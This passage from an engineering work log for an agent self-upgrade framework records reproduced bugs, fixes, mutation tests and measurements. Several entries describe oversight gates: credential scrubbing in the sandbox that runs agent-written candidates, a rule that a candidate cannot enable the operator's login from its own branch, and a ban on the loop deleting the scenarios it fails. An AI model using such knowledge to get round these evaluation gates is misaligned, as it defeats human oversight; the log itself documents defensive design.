  gate's worker. Narrowed to that one variable: allowlist alone ->
  `is_error: true`; allowlist + `USER` alone -> `OK`. `ClaudeCodeProvider`'s
  whole premise (ADR 0112 — the operator's login IS the credential) therefore
  fails in the only place the gates execute a candidate, and
  `UPGRADE_LOOP.md`'s "a prompt candidate is gated live or not at all"
  resolves to *not at all*. Reported, not fixed: widening a scrubbing
  allowlist so a shadow run can spend the operator's quota is an owner
  decision, not a typo correction.
- **F-M5-2 (HIGH).** `_live_provider_from_base_ref` carries only
  `{impl, model}` across the sandbox boundary and `node_worker._configure`
  rebuilds `ModelProviderConfig` from them, so `impl: command` — the one
  provider needing no credential, and the one ADR 0154 points every new
  adopter at — cannot be rebuilt worker-side. Reproduced through
  `run_corpus_isolated`: `IsolationError: worker refused configuration ...
  no `command:` block is present`, every scenario, every cohort member.
  With F-M5-3: **no** provider serves a live cassette miss inside the gates.
- **F-M5-1 (MEDIUM).** Obligation 6's every-graph scan (G1b, ADR 0168) is
  passed only when `--agent-path` is DEFAULTED, and G1a (ADR 0167) refuses a
  defaulted `--agent-path` under a non-default `--agent-root`. On a widened
  root, 5 graphs are discoverable and 1 is ever scanned.
- **Seams R1 and R2**, handed over mid-run by the third hunt, were both hit
  and worked around rather than papered over: migrate at the DEFAULT root so
  `--entrypoint` is dotted-importable, and doctor's obligation 3/6 asserted as
  they actually behave under a persona `--agent-path`.

All four are pinned `xfail(strict=True)`, so the day any of them is fixed the
suite says so.

**The measurement the gate could not make.** `aef loop score` runs in-process,
so F-M5-3 does not block it. Both arms live, cassettes stripped so neither
replays: incumbent mean **0.0000**, candidate mean **0.0000**, n=2.
**ADR 0157's L4 result does not reproduce on merged main.** M4's lesson gained
+0.5 because its text contained the literal `contains 'VERDICT:'` — 0157 named
that as teaching to the test — and ADR 0174 redacts the check's value from the
failure text. Both increments are right; their composition buys nothing on a
`contains` check. What a rule-based prompt lesson can do when the answer is
withheld is an open design question.

**`CLAUDE.md`.** The prompt-file bullet was replaced, in its own commit, with
the measured statement: what `migrate` does with prompt-file agents, that
containment is the PROVIDER's answer (with `codex` and a `{system}`-less
`command` template putting the persona in the user turn, and `impl: command`'s
`isolation:` being the owner's unverified assertion), Zone A `agents/` by
default and `--agent-root .claude/agents` opt-in with its blast radius stated,
`--proposer rule_based_prompt` plus the prose cohort, and that a prompt
candidate is scored live or not at all with S2's floor as the bar.
`tests/test_prompt_surface.py` passes on the new text unchanged.

**Green bar.** `pytest -q`: 2511 passed, 7 skipped, 4 xfailed (2522 collected,
2516 before — +6, none removed). `mypy aef examples`: 134 files clean.
`ruff check .` clean. `ruff format --check aef tests examples`: 271 files clean.

## S6 / J4 — The two signals, and which one came apart (2026-09-05)

ADR **0162**. Worker S6 of `UPGRADE_LOOP.md` (BEYOND_90's J4). Two rigs, one
point. **Dimension 3: 7 → 8** (heading 70 → 71). **Dimension 2: stays 12.**
**90 live calls of 90**, on `claude-opus-5[1m]` (session default),
`claude-haiku-4-5-20251001` and `claude-sonnet-5`, all through the harness
login with no key. Pre-registered in `docs/research/j4/prereg.txt` before the
first measurement call, amended twice, each amendment before the calls it
governs.

**Rig A — the self-preference control, which could not exist until now.** Four
ADRs (0115, 0123, 0159, 0171) recorded the same absence, and the obstruction
was structural: `LLMJudge` grades ONE state, so a judge could not prefer its
own writing even in principle. Eleven pairs of summaries of the same passage,
from a byte-identical recorded request — the cassette's (Opus) and a live one
(Haiku) — ranked by both those models and by a **disinterested** third that
wrote neither, position-swapped, with neither the caller's label nor the
writer's model anywhere in the prompt (asserted against the requests actually
issued, not intended).

    prefers the Opus-written summary   opus 0.714  haiku 0.444  sonnet 0.455
    self-preference vs the disinterested judge   opus +0.260   haiku +0.010
    agrees with the owner's checks (5 discriminating pairs)  2/3 · 5/5 · 5/5
    position-inconsistent                        4/11 · 2/11 · 0/11

The effect is measured PRESENT and **attributed to one judge**, which the
two-arm design could not have done: its difference-in-differences (+0.270) was
accidentally right only because Haiku's bias is ~0. The disinterested judge is
better on all three statistics.

**Mitigation implemented and re-measured** (the pre-registered second branch —
present-and-unmitigated would have been +0). `PairwiseRanker` in
`aef/reasoning/llm_reflection.py`: `allow_self_ranking=False` **refuses** rather
than warning (ADR 0105's reasoning — an automatic fallback is weaker than a
refusal), guarded twice because this repo's own default is `model: ""` and the
name is unknown until the call answers, and suffix-normalised so
`claude-opus-5[1m]` cannot slip past `claude-opus-5`. The shipped prompt is the
prompt that was measured, proved rather than claimed: sha256 pinned in the test
and the runner now imports the shipped strings instead of holding copies.

**Amendment 1, found by the dry run before any measurement call:** only
`sum-21`…`sum-39` were recorded on `claude-opus-5[1m]`. The corpus's original
twenty are **`claude-fable-5-1`** recordings, six of them in validation. ADR
0171 says nothing false, but a self-preference control over a Fable-written
summary measures nothing, so rig A uses the eleven Opus-recorded validation
scenarios and `load_pairs` now refuses the rest.

**Rig B — the harmful-and-resolved lesson, and why the point is not taken.**
The lesson came out of shipped code over the corpus's seven cap negatives
(records built the way ADR 0157 built its evidence, because M4b/ADR 0174 had
not landed) and into the prompt through the shipped retriever and renderer. Ten
live runs. On the five harm probes it made two runs **longer** and broke the
cap check it is about — harmful AND live, ADR 0118's coincidence again, by a
mechanism nobody predicted: 330 characters of prior-failure prose containing a
38-word example summary, inserted before the passage. Zero content checks
flipped, so the pre-registered condition did not fire.

The one run of the shape J4 wanted turned up in the *help* arm — `sum-35`, cap
resolved 30 → 28 words, a content regex broken — and it is **fragile**: the
regex admits "stays open" and not "staying open", which under ADR 0171's own
standard is a check to widen, not a content loss. And the shipped `_tally`,
**run** over the ten runs rather than reasoned about, reads
`helpful=7 harmful=3` with that very run counted **helpful**, because harm is
defined as "reproduced this signature" and `sum-35` produced a different one.
Ranking on the tally would rank on a signal that moves the wrong way as harm
increases. `memory_retriever.py` is untouched; the one-line blocker is named
in `consolidate.py` for whoever takes dimension 2 next.

**Reported, not fixed.** (1) Six corpus scenarios are `claude-fable-5-1`
recordings and nothing states it; the quota for that model is exhausted, so
they cannot be re-recorded. (2) A retrieved lesson made the failure it
describes MORE likely, twice — no measurement in this repo has looked for
that, because ADR 0110's A/B scored retrieval coverage and ADR 0155's arms
compared prompts. (3) `_tally`'s inversion.

**Green bar.** `pytest -q` 2423 passed / 6 skipped (from 2408; +15); `mypy aef
examples` clean on 132 files; `ruff check .` clean; `ruff format --check aef
tests examples docs/research/j4` 267 files formatted. 5 mutations against the
new test, 5 caught, control green before and after, every restore proved by
sha256 equality with a byte backup. `test_a_timed_out_container_is_actually_dead`
failed on a later full-suite run and passes in isolation — ADR 0171's docker
flake on the same test, noted rather than attributed here.


## Fix wave J1 — one loader, and a backstop that over-fired (ADR 0177)

Three findings of the third seam hunt: **R1** (HIGHEST), **R1's tail** and
**R5**. Zero live model calls. No rubric dimension moves. Every one reproduced
by running a command before anything was changed.

### R1 — `--entrypoint` could not name a graph under the widened agent root

`aef migrate --dir . --agent-root .claude/agents` is ADR 0152 §4's opt-in and
the only way a persona becomes Zone A. On the seam hunt's `r1` clone:

```
$ aef migrate --dir . --agent-root .claude/agents
wrote 1 prompt agent graph(s): <clone>/.claude/agents/migrated/reviewer/graph.py
EXIT=0

$ aef loop score '.claude/agents/migrated/reviewer/graph.py:build_graph' \
    --corpus corpus --splits train --config aef.yaml
error: the 'package' argument is required to perform a relative import
for '.claude/agents/migrated/reviewer/graph.py'
EXIT=1
```

Exit 1 is `EXIT_REJECTED`. ADR 0168 §M4 fixed this exact error for `aef run`
and called `import_graph_module` "the one importer" — it was one of **three**.
`aef/harness/scenario_runner.py:47` and `aef/harness/node_worker.py:53` each
kept their own `importlib.import_module`.

Through `aef loop cycle` that is worse than a refusal, because the two sides of
G2 used **different** loaders — the incumbent reconstructed from a recording
`aef loop record` could load, the candidate executed by the worker that could
not. Reproduced through the real gate on a real git repo with a widened
`ZonePolicy`:

```
G2 outcome : fail
G2 reason  : 1 previously-passing scenario(s) no longer pass (zero tolerance)
  evidence : s1: REGRESSION — incumbent passed (plan=done, 0 error(s));
             candidate did not (terminated=False, plan=None, 1 error(s), 0 policy denial(s))
```

while the worker had said, and `g2_outcome.py`'s `return {sid: r.outcome …}`
had thrown away:

```
IsolationError: worker for '.claude/agents/migrated/reviewer/graph.py:build_graph' failed:
cannot import '.claude/agents/…': TypeError: the 'package' argument is required to perform
a relative import
```

So on the documented opt-in **every prompt candidate is rejected forever**, and
two rejections halt the loop, with a ledger claiming a corpus regression that
did not happen.

**Fixed** with one loader, `aef/harness/graph_loading.py` — in the HARNESS,
because the harness may not import the CLI (`aef/harness/zones.py` carries the
same argument for `DEFAULT_AGENT_PATH`), with `aef/cli/run.py` importing and
re-exporting the published names. Call sites switched: `run.py`
(`import_graph_module`, `load_graph_module`, `run_graph_module`),
`scenario_runner.load_graph`, `node_worker.load_graph`.
`aef/config/domain_gates.py`'s `import_module` is deliberately out of scope —
it imports an evaluator suite, not a graph.

`scenario_runner.load_graph` caught **`ImportError` only**, and
`importlib.import_module` raises `TypeError` for a leading dot: that is
precisely how the error escaped the gate, escaped `cmd_score` and reached the
CLI's catch-all. Both loaders now catch it and name the ENTRYPOINT, not just
the module. G2's verdict and evidence carry each failed scenario's failure
string (first line, ≤200 chars).

**After**, the real `run_migrate --agent-root .claude/agents` into the real
`loop score`, stub `command` provider, no live call:

```
task metric — .claude/agents/migrated/reviewer/graph.py:build_graph (reviewer) — repeat=1
  train       n=1   with_checks=1   mean=1.0000 stdev=0.0000 ci95=[1.0000, 1.0000]
      1.0000  rev-1
EXIT=0
```

and the gate, still FAIL (it has no evidence of non-regression) but saying why:

```
G2 reason : 1 previously-passing scenario(s) no longer pass (zero tolerance)
            1 of them failed rather than answered: IsolationError: worker for
            '.claude/agents/migrated/reviewer/graph.py:build_graph' failed: cannot import …
```

**R1's tail** — `test_both_sides_of_g2_resolve_a_widened_root_entrypoint_identically`
runs the incumbent's loader in-process and the candidate's in the subprocess
the worker actually is, and asserts both give `reviewer`. The asymmetry is what
turned an import error into a "regression", so the symmetry is the property.

### R5 — S3b's content regexes tripped the 10,000-char backstop and aborted the whole suite

`(?i)(not (have been )?overloaded|no overloading|overloading (was )?(rejected|…))`
and its sibling are the only two regexes in `corpus/` carrying a repeated group,
both bounded (`( … )?`), both correctly allowed by ADR 0166's static detector —
and `if len(actual) > 10000 and _repeated_group_bodies(pattern): raise` fired on
them. The input that trips it is a model rambling past the 36-word cap, which
is the family all seven of ADR 0171's negatives belong to:

```
$ aef loop score agents.summary.graph:build_graph --corpus <scratch> --splits train
error: refusing to run regex check '(?i)(not (have been )?overloaded|…)' against 12000
characters: the pattern repeats a group and the input is over 10000 characters. ...
EXIT=1
```

and the second, 9,000-character scenario **never ran**, because `score_scenario`
sat OUTSIDE the try/except in both scoring paths. Measured, those patterns
decide that same 12,000-character input in 0.245 ms and 0.457 ms.

**Fixed, two parts.** (a) the backstop counts only **unbounded** quantifiers
(`+`, `*`, `{n,}`) — a bounded group enters its body a fixed number of times
whatever the input length. The old rule refused **six of ADR 0166's own eleven
`MUST_PASS` patterns** at 12,000 chars, including all three word-cap rewrites
its refusal message recommends; that list had been checked against the detector
and never against the backstop. Verified against: 21 detector patterns
(unchanged), 13 backstop patterns at 12,000 chars (all run, none over 0.4 ms),
every one of the corpus's 114 regex checks, three unbounded shapes that must
still be refused, and the original ReDoS pattern (still refused at every
length, in a child process under a wall clock). (b) a check that raises scores
THAT scenario 0 with `failure = "unusable check: <refusal>"` and the run's REAL
outcome — the graph ran; only the score is withheld — in both paths.

**After**, same corpus, same command: `mean=0.8333` on both scenarios,
`EXIT=0`, the content checks holding and the word cap failing, which is the
finding the scenario was recorded to produce.

### Tests that pinned the old behaviour, updated deliberately

`test_a_very_long_input_is_refused_rather_than_truncated` asserted the refusal
for a **bounded** pattern — one of the three rewrites ADR 0166's own message
recommends. It now asserts it for `^(?:\s+\S+)+$`, with the control that the
bounded one RUNS beside it. `test_a_malformed_entrypoint_is_refused` matched
`module:factory`, which now names half the accepted forms.

### Mutations

8 of 8 caught; every restore from a byte backup, every before/after/backup
sha256 equal, never `git checkout --`.

| # | mutation | result |
|---|---|---|
| M1 | `scenario_runner.load_graph` imports a dotted name only | KILLED (4 failed) |
| M2 | `node_worker.load_graph` imports a dotted name only | KILLED (3 failed) |
| M3 | the worker drops the entrypoint from its message | **SURVIVED first pass**, KILLED after the control was rebuilt |
| M4 | G2 drops the failure strings again | KILLED (1 failed) |
| M5 | the backstop keys on ANY repeated group again | KILLED (10 failed) |
| M6 | the backstop never fires | KILLED (4 failed) |
| M7 | `score_scenario` back outside the try, in-process path | KILLED (2 failed) |
| M8 | `score_scenario` back outside the try, isolated path | KILLED (1 failed) |

M3 survived because `IsolationError` wraps every worker failure in
`worker for '<entrypoint>' failed`, so the assertion passed with the entrypoint
deleted from `load_graph`'s own message. The test now calls
`node_worker.load_graph` directly and asserts on `WorkerError`.

### Green bar

```
pytest -q                                2544 passed, 6 skipped (2550 collected,
                                         from 2516 — +34, none removed)
mypy aef examples                        Success: no issues found in 135 source files
ruff check .                             All checks passed!
ruff format --check aef tests examples   272 files already formatted
```

Errata filed on ADR 0168 (one loader of three was taught the file form) and
ADR 0166 (the backstop over-fired on bounded groups, and a check's raise was
suite-fatal).

### Reported, not fixed

- `aef/cli/loop.py`'s `--module`/`--entrypoint` help text still says "module"
  although every one of them accepts a path now; `aef/cli/loop.py` is held by
  two other workers this wave.
- `harness/loop.py`'s cohort path builds `precomputed` outcomes and drops the
  failure strings again, so a cohort-run rejection still cannot say why.


---

## Fix wave J3 — a provider property is not the agent's failure (ADR 0179)

**Branch:** `fix/j3-provider-fact-not-failure`, off `db2987a`.
**Scope:** findings R3, R4, R6, R7 of the third seam hunt.
**Rubric claim: none. No dimension moves.** Zero live model calls; no arm was
scored. What R6 changes about dim 2's wording is at the end.

### Expectation, stated before the work

Four findings were handed over as suspected. The expectation was that all four
would reproduce, that R3 and R4 would turn out to be one fix in two files, and
that R6 would be the ADR 0155 shape one level out — a wire closed in this
repo's own fixture and open on every repo the scaffold generates. Three of
those held; the fourth (R7) was smaller and more embarrassing than expected,
because the test named for the property could not see the property.

### Reproduced, each by RUNNING

**R3.** A synthetic adopter repo, the real `run_migrate`, an `aef.yaml` with
`impl: command` and no `{system}` slot (≡ ADR 0169's `codex` row), a stub CLI
that answers correctly, three `run_graph_module` calls against one durable
memory file:

```
  answer          : PARIS
  containment     : {'provider': 'command', 'isolation': ['user_turn_persona'],
                     'persona_role': 'user'}
  errors          : ['prompt_agent.persona_in_user_turn']
  task_completion : 0.0          (x3)
failure records in memory: 3
```

then `RuleBasedPromptProposer`:

```
reason: appended a bullet for 'failure:prompt_agent'
- <!-- aef sig=failure:prompt_agent runs=3 --> 1 error(s) recorded; 0/0 tool
  call(s) failed. errors[0]: {'node_id': 'prompt_agent', 'type':
  'prompt_agent.persona_in_user_turn', 'provider': 'command', …
```

**R4.** Real `ClaudeCodeProvider` + `CodexProvider`, no calls:
`fallback role=unknown isolation=[]`; through the node with the backup
answering, `errors: NONE`.

**R7.** Identical payloads through both real adapters:
`ClaudeCodeProvider -> usage_match`, `GrokProvider -> heuristic`.

**R6.** Real `run_migrate` then three real runs: `generated graph nodes:
['consolidate', 'prompt_agent', 'reflect']`, `retrieved_context=[]` on all
three, `retrieved_signatures: []` on every record, and
`entry sig=failure:prompt_agent occurrences=3 helpful=0 harmful=0` — a lesson
formed and seen by nothing.

### What was done

- The containment fact moved out of `state.errors` into a `warning` key inside
  the containment record the node already writes, with
  `containment_warnings(state)` as THE reader. `state.warnings` was considered
  and rejected on `AEFState`'s own docstring. `make_reflect_node`'s failure
  classification is **deliberately unchanged** — a filter there would be a
  second answer to "what counts as a failure".
- `RuleBasedPromptProposer` drops any record whose text names a
  `prompt_agent.*` type and counts it in the reason. Matched on text, not
  signature: the reproduced signature is `failure:prompt_agent`, a NODE id.
- `FallbackProvider.isolation` splits: claims intersect, the channel marker
  resolves hazard-wins, `system_role` only when every member declares it.
  Conservative rather than exact, and affordable only because R3 made the note
  cost attention instead of the task metric.
- `GrokProvider` passes `usage` to `answering_model`, and a new test reaches
  rule 4 (`model=""`, two-key map, first key writing more output).
- The migrate template becomes `retrieve → prompt_agent → reflect →
  consolidate → END`, and `PromptAgentNode` renders retrieved lessons into the
  USER turn after the objective — not the system prompt, for three reasons in
  ADR 0179. Byte-identical request when nothing was retrieved.

### Measured after

```
--- run 1 -----------------------------------------
  errors          : []
  task_completion : 1.0          (x3)
failure records in memory: 0
proposals: 0
```

```
fallback role=user    isolation=['user_turn_persona']
GrokProvider       -> model=big-answerer   attribution=usage_match
```

```
retrieved chunks: 3
--- the USER turn the provider actually received -------------
What is the capital of France? Answer in one word.

Lessons from this agent's earlier runs (most relevant first):
- [failure:prompt_agent] ALWAYS-NAME-THE-COUNTRY-TOO
--------------------------------------------------------------
reflection record retrieved_signatures: ['failure:prompt_agent']
```

### Green bar

`pytest -q` **2520 passed, 6 skipped** (2526 collected, from 2516 at
`db2987a`: **+10, none removed**). `mypy aef examples` clean, 134 files.
`ruff check .` clean. `ruff format --check aef tests examples` clean.
`tests/test_vendor_isolation.py`, `tests/test_prompt_surface.py` and S1's
golden green.

Two tests deliberately rewritten, not worked around: one pinned the warning as
`delta.errors[0]`, one pinned the three-node generated graph.

### Mutations

Seven, six detected and the control correctly not; every restore verified
against a `shasum -a 256` byte backup, `python -B` with `__pycache__` purged.
M1 was additionally run as the finding words it — mutate, then re-execute the
original three-run reproduction — which showed the second line of defence
holding alone (`proposals: 0`); M1+M2 together put the bullet back verbatim.

### Verdict

Four findings closed, no rubric movement claimed. Dim 2's open clause "no
prompt reads it" is now false on the generated path as well as the fixture;
what replaces it is "no measurement shows reading it helps", which is ADR
0155's standing result and is untouched here. **Undone and named:** surfacing
the containment warning in `aef loop doctor` / the cycle summary —
`containment_warnings()` is written and tested, `aef/cli/loop.py` and
`preflight.py` belong to J2 in this wave and were not touched.

## Fix wave I1 — two spellings of "which graph", and no way back (ADR 0176)

Four findings, none of them this worker's own discovery: three from ADR 0174's
"Defects found outside this worker's files" (M4b) and one from ADR 0172's
"Reported for migrate's owner, not fixed here" (H1). Every one was reproduced
by RUNNING a command before anything changed. **Zero live model calls** — the
graphs here never reach their model path.

**F2 — `aef loop cycle` dropped all its evidence without `--graph-id`.**
Bootstrap two inputs whose owner checks the graph fails, so ADR 0174's producer
writes two `failure` records, then cycle with the prompt proposer:

```
$ aef loop cycle --repo repo --state state --workdir work --corpus corpus \
    --memory memory.jsonl --proposer rule_based_prompt \
    --agent-path agents/demo/persona.md
  the proposer produced nothing from the available evidence: 2 record(s)
  dropped as another graph's scenario; no admissible failure record for this graph
exit=0

$ aef loop cycle … --graph-id demo_agent
  proposed cycle-20260905T040818-prompt on local branch loop/cycle-…-prompt
  gated: reject — G1 rejected it: build command failed (exit -1): python -m pytest -q
exit=1
```

Same evidence, one flag, and the flag's value was in the corpus the command had
already loaded.

**The complication, and it is why the fix has a branch nobody would guess at.**
`--graph-id` is TWO things: the archive key G5 reads a blessed baseline under,
and — only for `RuleBasedPromptProposer` — a `Graph.id` scenarios are matched
against. ADR 0125 separated those namespaces deliberately, and
`_scenarios_for_graph` still gates every scenario when the corpus records one
graph for exactly that reason. So the first version of this fix, which derived
unconditionally, moved the archive key out from under an already-blessed
baseline:

```
$ pytest tests/cli/test_adoption_sequence.py
E   AssertionError: not built: G5 rejected the candidate first, so its code
E   was never executed
```

`aef loop bless` takes no `--corpus` at all, so the documented adoption sequence
blesses under `"default"` and would then cycle under `demo_agent`. That is a
worse defect than the one being fixed, and the suite found it, not a reading of
the code.

Shipped: the parser default becomes `None`, so **omitting the flag is
distinguishable from typing it** — everything rests on that — and
`resolve_graph_id_from_corpus` settles the value before `_config` freezes it
into `LoopConfig`. Derive from a single-graph corpus when there is no baseline
to orphan, and say so **in the verdict line** (the line a workflow tees into its
step summary); keep the key and warn with the exact `bless` command when there
is; refuse with the list when the corpus records several; refuse an explicit id
the corpus has never heard of unless a baseline sits under it, in which case it
is ADR 0125's archive-key namespace and gets a warning rather than a refusal.
The refusals are `GraphIdError`, exit 1 and journalled, never a halt.

**F3 — `loop score` took `module:factory`, `loop bootstrap` took `module`.**

```
$ aef loop score agents.demo.graph --corpus corpus
error: entrypoint must be 'module:factory', got 'agents.demo.graph'
$ aef loop bootstrap agents.demo.graph:build_graph --corpus corpus2 --inputs …
error: No module named 'agents.demo.graph:build_graph'
$ aef loop score /…/agents/demo/graph.py --corpus corpus
error: entrypoint must be 'module:factory', got '/…/agents/demo/graph.py'
```

Two loaders, neither wrong alone: `cli.run.load_graph_module` has ADR 0168's
file path and no `BaseException` guard; `scenario_runner.load_graph` has ADR
0085's guard and no file path. One `GRAPH_REFERENCE_HELP` shared **by
reference** by five arguments — five copies of a help string is how `score` came
to describe the same argument a sixth way — and one `load_graph_reference` that
keeps BOTH controls and adds the `isinstance(graph, Graph)` check to all five.
The split is on the last colon and only when the tail is an identifier, so
`a/b/graph.py`, `a/b/graph.py:make` and `C:\a\graph.py` all read the way they
look. The enumerating test derives the covered set from the REAL parser (the
G1a pattern) and runs all fifteen combinations producer→parser→loader.
`run --module` and `--entrypoint` are other workers' files and are pinned as
known gaps rather than half-converted.

**F4 — a copied corpus's stale manifest, and no way back.**

```
$ aef loop cycle … --corpus copied --no-memory
error (CorpusShrankError): corpus shrank: 1 previously-admitted scenario(s) are
gone: ['s-2']. A suite that can be made to pass by deleting the failing case is
not a suite.
exit=3

$ aef loop --help
  {gate,monitor,digest,status,record,bootstrap,score,skills,harvest,cycle,run,bless,doctor}
```

No `corpus` subcommand at all. The refusal is RIGHT — ADR 0141 built it because
deleting the two scenarios the agent failed raised `aef loop score` from 0.6667
to 1.0000 with nothing complaining — and it is **not weakened**: it fires on
exactly the same condition, and mutation M11 re-verifies that it still fires
after being given a remedy. What was missing was the remedy. Without one the
thing people actually do is delete `manifest.json`, which loses every id it was
keeping.

```
$ aef loop corpus reconcile --corpus copied
  DROPPED  s-2 (was train) — no file on disk
manifest rewritten from disk: 1 dropped, 0 moved, 0 added, 2 scenario(s) now recorded
  Those ids are no longer admitted evidence. Commit this manifest in its own
  reviewable change — retiring a scenario is an owner's decision and the diff is
  the record of it (ADR 0141).
```

**The loop provably cannot run it** (ADR 0060's shape): an AST scan over `aef/`
pinning the single caller, a ban on the word `reconcile` inside `cmd_cycle` and
`cmd_run` so an indirect helper cannot slip past a one-hop scan, and a
`save_manifest` caller pin. Verified against the planted fault — putting
`reconcile_manifest(...)` inside `cmd_cycle` fails the test, naming that call
site. A malformed scenario is NOT reconciled away, because a corrupt write must
not be able to retire evidence.

**F1 (H1's finding 1) — `discover_skills` counted adopt's own skill.** On the
pilot clone, adopt said 5 and migrate said 6 about the same tree, the sixth
being the `new-model-check/SKILL.md` adopt had just written. Migrate importing
adopt is a hard cycle, and it was reproduced rather than assumed — the import
patched into the real file, run both directions, restore SHA-256 verified:

```
ImportError: cannot import name '_ADOPT_SKILL_PATH' from partially initialized
module 'aef.cli.adopt' (most likely due to a circular import)
```

So the string moved to `aef/harness/zones.py`, which both CLI modules already
import and which imports neither — the same home and the same argument
`DEFAULT_AGENT_PATH` already has. Only the COUNT excludes it; the listing still
NAMES it, marked `(aef's own — not yours)`, because a migrate that goes silent
about a file it declined to migrate is the one thing that block exists not to
be. H1 wrote its pinned test to hold both numbers so that *"the day migrate
mirrors it, that test says so"*. It said so, and it now asserts the two AGREE,
with the history in its docstring.

**Green bar:** `pytest -q` 2570 passed / 6 skipped, `mypy aef examples` clean,
`ruff check` clean, `ruff format --check` clean. **+60 tests, 2510 → 2570.**
**14 mutations planted, 14 killed**, every restore byte-identical by SHA-256.

**Reported, not fixed** (in ADR 0176's own defects section): `--entrypoint` is
a fourth spelling of "which graph" and `run --module` a fifth, both in other
workers' files; `LoopConfig.graph_id` is one field serving two namespaces, which
is the root of F2 and the reason its fix needs a warning branch at all;
`aef/cli/adopt.py` still spells the skill path itself, pinned by a test until
its owner makes it an alias; one flaky container-sandbox test; and the fact that
the suite fails 28 tests with `[Errno 2] No such file or directory: 'python'`
when the venv is not on `PATH`, which looks exactly like a regression and is not.


## Fix wave K2 — the good column, the quotation, and the one call site (ADR 0180)

Three findings that earlier workers reproduced and could not fix because the
files were not theirs. All three reproduced again here, from committed data,
before anything changed. **Zero live model calls.**

**1. The tally counted a harmful run as helpful.** ADR 0118's `_tally` had two
branches around `_reproduced()` — reproduced the lesson's failure, or not — and
no room for *had the lesson, resolved that failure, failed something else*. So
ADR 0162 rig B's `sum-35-priory-gatehouse`, the single run in the entire rig
with the shape a ranking signal would need, was counted **helpful**: the
word-cap lesson shortened its summary from 30 words to 28 and the shortened
text stopped matching a content regex the baseline passed. Replayed here
through the shipped `default_signature` and the shipped consolidator, the ten
runs read `helpful=7 harmful=3` with that run inside the 7. `_tally` now splits
three ways — `harmful` (reproduced it), `helpful` (failed **nothing**),
`harmful_elsewhere` (resolved it and failed something else) — and the same ten
runs read `helpful=6 harmful=3 harmful_elsewhere=1`. "Failure" is the record's
`kind`, never a prefix on its signature, so a custom `signature_fn` cannot fool
it. **Nothing ranks on the new counter.** ADR 0162 refused to rank because the
signal read backwards; reading forwards earns it a place in the metadata, not a
coefficient, and `knowledge_boost` stays 0.0.

`test_a_reordered_chain_is_a_different_failure_and_is_not_a_recurrence`
asserted the old `(1, 0)` and was updated deliberately to `(0, 0, 1)`. The
subsequence rule it exists for is unchanged.

**2. The check-derived record quoted the model's own output back into its next
prompt.** `observed 406 words, 2836 chars: '**No. The Accela connector…'`. ADR
0174 argued that the observed value is the run's own and recording it records
what happened — right about provenance, silent about destination:
`verbal_feedback` is what `RuleBasedPromptProposer` pastes into a persona and
what `render_retrieved_context` renders as a bullet. ADR 0162 measured the
cost — a lesson whose text carried a 38-word example summary made two at-cap
runs LONGER (23 → 28 against a cap of 25; 38 → 41 against 38) and broke the
very check the lesson describes. This is ADR 0110's *the model is never trusted
with provenance* failing one layer down: there the model was kept out of the
counted fields, here its text was put into the counted field's explanation. The
line now keeps every count the harness computed and drops the quotation. On
`sum-35`, 33 twelve-character windows of the output in `verbal_feedback` (48
anywhere in content) became **0**. A non-text value is reported by type rather
than by `repr`, whose *length* is the answer on a boolean field. The output
stays readable in the recorded scenario's trace, named in an `output_location`
key that reaches no prompt.

The first draft of that fix put the forwarding address inside the failure line
and the critic's 160-character excerpt then cut the observation out of
`verbal_feedback`. A test caught it, which is the only reason it is a sentence
here rather than a regression.

**3. The producer was wired into `bootstrap` alone.** ADR 0175's arm (c)
recorded `"failures": {}` while six of seventeen scored runs failed an owner
check: nothing outside `bootstrap` could write a check-derived record, so
`runs_since_last_seen` climbed to 17, ADR 0116's staleness demotion walked the
seeded lesson from rank 0 to rank 39, and the two negatives late in the split
never saw it — halving the power of the comparison S1b existed to run.
`record_check_outcomes(...)` replaces `write_check_failure_record` and is
idempotent per `(agent_id, run_id, failed check keys)` by two independent
guards — a derived record id, and a store query — so wiring it at more than one
site cannot inflate `source_record_ids`. **ADR 0174's refusal of the gate path
stands**: a gate run writing to the durable store would let scoring a candidate
manufacture the next one's evidence, so the store is the caller's to supply and
a gate path supplies none. `harvest` is re-refused for its own reason — a
production run carries no owner check to evaluate. The two call sites that
should exist are REPORTED because the files belong to other workers:
`run_scenario(..., memory: MemoryStore | None = None)` and `cmd_score
--memory`.

**Reported, not fixed.** `harmful_elsewhere` is not surfaced in
`aef/services/context/memory_retriever.py`'s chunk metadata or in
`aef/harness/skills.py`'s draft, both of which print `helpful`/`harmful`; those
are one-line additions in files outside this worker's list.

**No rubric dimension moves,** and the rubric is untouched. What a re-run of
S1b's four arms would need is written into ADR 0180 rather than left to be
re-derived: the excerpt gone from the lesson text, the producer on the scored
split, and repeats — S1b's own same-prompt variance ran to 0.0857 and every
arm-to-arm delta sat inside it.

**Green bar.** `pytest -q` 2590 passed / 7 skipped / 4 xfailed (from 2572;
+18); `mypy aef examples` clean on 134 files; `ruff check .` clean; `ruff
format --check aef tests examples` 274 files formatted. 5 mutations, 5 caught,
control green before and after, both restores proved by sha256 equality with a
byte backup. `tests/cli/test_prompt_repo_acceptance.py::test_a_prompt_file_repo
_goes_from_adopt_to_a_gated_prompt_candidate` fails, and fails identically on
the merge base — verified by exporting `git archive HEAD` to a clean tree and
running the same suite there (`1 failed, 2572 passed, 7 skipped, 4 xfailed`,
same test, same assertion). It is ADR 0178's `loop doctor` surface and nothing
here goes near it.


## Fix wave K1 — the login that never reached the one place candidates run (ADR 0181)

ADR 0158's two HIGH findings, closed. They were separate defects with one
consequence: **no provider served a live cassette miss inside the gates, on any
repo.** `UPGRADE_LOOP.md` says *a prompt candidate is gated live, or not at
all*; it resolved to the second, every time, everywhere.

**F-M5-3 was a decision, and M5 said so** — "the allowlist exists so no
credential is inherited, and adding `USER` is how the shadow run gains the
operator's quota". Both halves true, pointing opposite ways: `sandbox.py`
scrubs the environment of the one process that runs agent-written code, and
ADR 0112's premise is that the harness login IS the credential. The decision:
**live model calls inside the gates are an explicit per-repo opt-in, off by
default** — `gates.live_model_calls` in `aef.yaml`, read from the **base ref**
like every other rule a candidate is judged by (ADR 0082: a candidate that
could set this in its own branch would be handing itself the operator's
login). False — the default, and what every existing repo gets — leaves the
worker's allowlist byte-for-byte what it was, and `--cassette-miss live` is
**refused by name** instead of rejecting every candidate on an environment
artifact. True adds `HARNESS_LOGIN_ENV`, and every `gated` ledger event records
`live_model_calls` so the audit trail says which passes spent the quota.

**The variable was measured, not guessed.** Five probes of the exact argv
`ClaudeCodeProvider` builds: allowlist as shipped → `Not logged in`;
**+`LOGNAME` → still `Not logged in`**; +`USER` → `OK`; allowlist *minus*
